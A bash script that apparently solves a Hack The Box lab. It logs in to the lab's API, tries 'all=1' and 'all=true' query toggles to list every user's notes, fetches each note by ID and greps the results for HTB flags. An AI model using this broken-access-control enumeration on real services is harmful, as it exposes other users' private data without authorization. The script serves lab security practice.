#!/usr/bin/env bash
set -euo pipefail
IP=${1:-94.237.49.23}
API_PORT=${2:-41412}
TO=${3:-8}
OUT_DIR=${4:-/workspace/recon/httpx}
mkdir -p "$OUT_DIR"
API_BASE="http://$IP:$API_PORT"
# Fresh token
curl -fsS -m 8 --connect-timeout 8 -H 'Content-Type: application/json' \
  -d '{"email":"a@a.com","password":"a"}' \
  "$API_BASE/api/auth/login" > "$OUT_DIR/login_resp.json"
TOKEN=$(jq -r .token "$OUT_DIR/login_resp.json")
# Try /api/notes?all=1 (path-as-is) and capture status
STATUS=$(curl -s -m "$TO" --connect-timeout "$TO" --path-as-is -H "Authorization: Bearer $TOKEN" \
  -o "$OUT_DIR/notes_all1.json" -w "%{http_code}" "$API_BASE/api/notes?all=1" || true)
echo "status_all1=$STATUS" > "$OUT_DIR/notes_all1.status"
# If not 200, try alternate toggles
if [[ "$STATUS" != "200" ]]; then
  STATUS=$(curl -s -m "$TO" --connect-timeout "$TO" --path-as-is -H "Authorization: Bearer $TOKEN" \
    -o "$OUT_DIR/notes_all_true.json" -w "%{http_code}" "$API_BASE/api/notes?all=true" || true)
  echo "status_alltrue=$STATUS" > "$OUT_DIR/notes_all_true.status"
fi
# Pick the first JSON that exists
LIST_JSON=""
if [[ -s "$OUT_DIR/notes_all1.json" ]]; then LIST_JSON="$OUT_DIR/notes_all1.json"; fi
if [[ -z "$LIST_JSON" && -s "$OUT_DIR/notes_all_true.json" ]]; then LIST_JSON="$OUT_DIR/notes_all_true.json"; fi
# Fallback: standard /api/notes (user only)
if [[ -z "$LIST_JSON" ]]; then
  curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" \
    "$API_BASE/api/notes" > "$OUT_DIR/notes_list_user.json" || true
  LIST_JSON="$OUT_DIR/notes_list_user.json"
fi
# Harvest note IDs and fetch each
if jq -e '.notes|type=="array"' "$LIST_JSON" >/dev/null 2>&1; then
  jq -r '.notes[].id' "$LIST_JSON" | while read -r nid; do
    [[ -z "$nid" ]] && continue
    curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" \
      "$API_BASE/api/notes/$nid" > "$OUT_DIR/note_${nid}.json" || true
  done
fi
# Grep for HTB flag across fetched notes
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR" > "$OUT_DIR/harvest_hits.txt" || true
sed -n '1,120p' "$OUT_DIR/harvest_hits.txt" || true
